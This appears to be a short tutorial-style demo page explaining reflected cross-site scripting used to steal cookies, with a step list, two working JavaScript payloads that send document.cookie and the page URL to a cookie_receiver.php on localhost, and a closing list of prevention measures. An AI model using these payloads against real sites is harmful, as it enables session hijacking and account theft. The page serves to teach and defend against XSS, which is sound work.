Understanding the Attack

This demonstration shows how a Cross-Site Scripting (XSS) attack can be used to steal cookies from users. The attack follows these steps:

1 Identify Vulnerable Page: Find a page that reflects user input without sanitization (like vulnerable_page.php)
2 Craft XSS Payload: Create a malicious script that steals cookies and sends them to an attacker-controlled server
3 Inject Payload: Inject the payload into the vulnerable page via URL parameter
4 Capture Cookies: The cookie receiver server captures and logs the stolen cookies

XSS Payload for Cookie Stealing

The following payload will steal all cookies and send them to the cookie receiver:

Payload (URL encoded):
<script> var img = new Image(); img.src = 'http://localhost/cookie_receiver.php?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(window.location.href); </script>
One-liner payload (for URL injection):
<script>var i=new Image();i.src='http://localhost/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);</script>

Prevention

To prevent XSS attacks:

  • Always sanitize and validate user input
  • Use htmlspecialchars() or htmlentities() when outputting user data
  • Use Content Security Policy (CSP) headers
  • Set cookies with HttpOnly flag to prevent JavaScript access
  • Use prepared statements for database queries
